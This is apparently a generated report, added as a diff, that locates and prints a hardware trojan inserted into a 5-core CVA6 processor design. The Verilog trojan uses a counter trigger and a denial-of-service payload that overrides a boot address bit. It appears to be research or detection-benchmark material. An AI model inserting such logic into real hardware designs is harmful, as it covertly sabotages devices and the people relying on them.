@@ -1,0 +1,33 @@
+Trojan Location Report
+Design 2: 5-core CVA6
+Trigger: counter, Payload: dos
+Generated: 2026-01-21T17:31:08.506554
+================================================================================
+
+Trojan Location: Lines 5957 - 5978
+Trojan Size: 22 lines
+
+Exact Trojan Code:
+--------------------------------------------------------------------------------
+  5957:   // === INSERTED TROJAN START ===
+  5958:   // Trigger: counter, Payload: dos
+  5959:   // Inserted: 2026-01-21T17:30:44.645722
+  5960: 
+  5961:   reg [15:0] trojan_counter_2;
+  5962:   wire trojan_trigger_2;
+  5963: 
+  5964:   always @(posedge clk_i or posedge rst_ni) begin
+  5965:     if (rst_ni)
+  5966:       trojan_counter_2 <= 16'h0000;
+  5967:     else if (boot_addr_i[0])
+  5968:       trojan_counter_2 <= trojan_counter_2 + 1;
+  5969:   end
+  5970:   assign trojan_trigger_2 = (trojan_counter_2 == 16'hFFFF);
+  5971: 
+  5972:   wire trojan_payload_2; assign trojan_payload_2 = trojan_trigger_2 ? 1'b0 : boot_addr_i[0];
+  5973: 
+  5974:   // Connect Trojan signals to output ports
+  5975:   assign trojan_trigger_o = trojan_trigger_2;
+  5976:   assign trojan_payload_o = trojan_payload_2;
+  5977: 
+  5978:   // === INSERTED TROJAN END ===
